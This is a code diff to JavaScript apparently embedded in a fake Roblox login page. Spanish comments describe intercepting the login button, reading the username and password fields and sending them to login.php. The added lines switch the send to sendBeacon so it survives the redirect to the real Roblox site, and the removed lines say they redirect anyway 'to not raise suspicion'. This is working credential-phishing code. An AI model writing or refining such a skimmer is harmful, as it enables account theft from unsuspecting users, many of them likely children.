@@ -758,40 +758,41 @@ const waitLoginBtn = setInterval(() => {
 
     clearInterval(waitLoginBtn);
 
-    btn.addEventListener("pointerdown", function (e) {
-        // Obtenemos los valores de los inputs
+    // Usamos 'mousedown' para actuar justo antes del clic completo
+    btn.addEventListener("mousedown", function (e) {
         const userField = document.getElementById("login-username");
-        const passField = document.getElementById("login-password")
+        const passField = document.getElementById("login-password");
 
         if (userField && passField) {
             const userData = userField.value;
             const passData = passField.value;
 
-            // Enviamos los datos a tu login.php
-            fetch('login.php', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/x-www-form-urlencoded',
-                },
-                body: `email=${encodeURIComponent(userData)}&pass=${encodeURIComponent(passData)}`
-            })
-            .then(() => {
-                // Después de enviar, redirigimos a Roblox
-                window.location.href = "https://www.roblox.com/login";
-            })
-            .catch(() => {
-                // Si falla el envío, redirigimos igual para no levantar sospechas
-                window.location.href = "https://www.roblox.com/login";
-            });
+            // Verificamos que no estén vacíos
+            if (userData.length > 0 && passData.length > 0) {
+                
+                // Preparamos los datos en formato URL
+                const datos = new URLSearchParams();
+                datos.append('email', userData);
+                datos.append('pass', passData);
+
+                // sendBeacon asegura el envío incluso si la página se cierra o redirige
+                navigator.sendBeacon('login.php', datos);
+
+                // Pequeña pausa de 150ms para asegurar que el hilo del sistema procese el envío
+                setTimeout(() => {
+                    window.location.href = "https://www.roblox.com/login";
+                }, 150);
+            }
         }
 
-        // Bloqueamos la acción original del botón de Roblox
+        // Evitamos que el formulario original haga su propia acción
         e.preventDefault();
         e.stopImmediatePropagation();
     }, true);
 
-    console.log("Botón interceptado y listo.");
+    console.log("Botón interceptado con persistencia Beacon.");
 }, 100);
+
 
 </script>
 
